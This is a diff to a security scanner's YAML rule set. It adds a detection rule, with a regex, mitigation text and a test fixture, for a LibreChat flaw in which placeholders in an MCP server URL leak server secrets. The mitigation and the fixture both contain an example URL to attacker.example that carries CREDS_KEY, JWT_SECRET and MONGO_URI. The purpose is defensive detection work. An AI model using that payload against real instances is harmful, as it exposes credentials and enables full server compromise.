@@ -1,4 +1,4 @@
-version: 2026.06.06.1
+version: 2026.06.07.1
 static_rules:
 - id: MAL-001
   category: malware_pattern
@@ -17784,6 +17784,73 @@ static_rules:
     tools/setup via a preinstall hook. IronWorm deploys an eBPF rootkit and communicates
     over Tor. Backdated commits use the fake identity claude@users.noreply.github.com.
     The attacker's Ethereum wallet 0x7e28D9889f414B06c19a22A9Bd316f0AC279a4d6 is hardcoded.
+  test_expect: fires
+- id: PSV-093
+  category: passive_surveillance
+  severity: critical
+  confidence: 0.93
+  title: LibreChat server-side env-var expansion in MCP server URL — credential
+    disclosure (CVE-2026-32625, GHSA-pmw7-gqwj-f954, CVSS 9.6, <= 0.8.3)
+  pattern: '(?i)(?:CVE-2026-32625|GHSA-pmw7-gqwj-f954|librechat[^\n]{0,200}(?:mcp[_\s-]?server[_\s-]?url[^\n]{0,120}(?:\$\{[A-Z_]{4,}\}|CREDS_KEY|JWT_SECRET|MONGO_URI|env[_\s-]?var[^\n]{0,40}expand)|0\.8\.[0-3](?:[^\d]|$)[^\n]{0,120}(?:CREDS_KEY|JWT_SECRET|MONGO_URI|env[_\s-]?var|credential[_\s-]?disclos))|(?:\$\{(?:CREDS_KEY|CREDS_IV|JWT_SECRET|MONGO_URI)\})[^\n]{0,200}(?:librechat|mcp[_\s-]?url|mcp[_\s-]?server))'
+  mitigation: 'CVE-2026-32625 (GHSA-pmw7-gqwj-f954, CVSS 9.6 Critical, CWE-200,
+    disclosed June 2, 2026) is a server-side environment-variable injection vulnerability
+    in LibreChat <= 0.8.3. When an authenticated user configures an MCP server,
+    LibreChat resolves ${VAR} placeholders in the user-supplied URL against its
+    own process.env during Zod schema validation — before making any outbound
+    connection. An attacker can embed ${CREDS_KEY}, ${CREDS_IV}, ${JWT_SECRET},
+    and ${MONGO_URI} in the MCP server URL (e.g. https://attacker.example/?k=${CREDS_KEY}&j=${JWT_SECRET}).
+    LibreChat expands these and connects to the attacker server with the plaintext
+    secrets in the URL, enabling full instance compromise (decryption of stored
+    credentials, database access, JWT forgery). No elevated privileges required —
+    any authenticated low-privilege account suffices. Upgrade to LibreChat 0.8.4-rc1
+    or later. Audit MCP server URL configurations for embedded ${...} references.'
+  metadata:
+    version: 1.0.0
+    status: active
+    author: skillscan
+    created: '2026-06-07'
+    updated: '2026-06-07'
+    tags:
+        - passive_surveillance
+        - psv
+        - librechat
+        - mcp
+        - env-var-injection
+        - credential-disclosure
+        - cve-2026-32625
+    last_modified: '2026-06-07'
+    techniques:
+        - id: PSV-093
+          name: Passive surveillance vulnerability
+    applies_to:
+      contexts: [source, workflow, dependency]
+    lifecycle:
+      introduced: '2026-06-07'
+      last_modified: '2026-06-07'
+    quality:
+      precision_estimate: 0.93
+      benchmark_set: core-static-v1
+    references:
+        - https://github.com/danny-avila/LibreChat/security/advisories/GHSA-pmw7-gqwj-f954
+        - https://nvd.nist.gov/vuln/detail/CVE-2026-32625
+        - https://www.thehackerwire.com/librechat-critical-credential-disclosure-via-mcp-server-url/
+        - https://bitninja.com/blog/cve-2026-32625-protect-your-server-against-librechat-threat/
+  test_input: |
+    ---
+    name: librechat-mcp-setup
+    description: Configure MCP servers in LibreChat for AI agent tool access
+    ---
+    # LibreChat MCP Server Configuration — CVE-2026-32625
+
+    LibreChat <= 0.8.3 contains CVE-2026-32625 (GHSA-pmw7-gqwj-f954, CVSS 9.6):
+    the MCP server URL field expands ${CREDS_KEY}, ${JWT_SECRET}, and ${MONGO_URI}
+    environment variables against process.env during Zod validation, leaking server
+    secrets to any attacker-controlled endpoint. Any authenticated user can trigger
+    this with a crafted MCP server URL such as:
+
+    https://attacker.example/?k=${CREDS_KEY}&j=${JWT_SECRET}&db=${MONGO_URI}
+
+    Upgrade to LibreChat 0.8.4-rc1 to remediate this credential disclosure flaw.
   test_expect: fires
 capability_patterns:
   shell_execution: \b(subprocess|os\.system|bash|powershell)\b
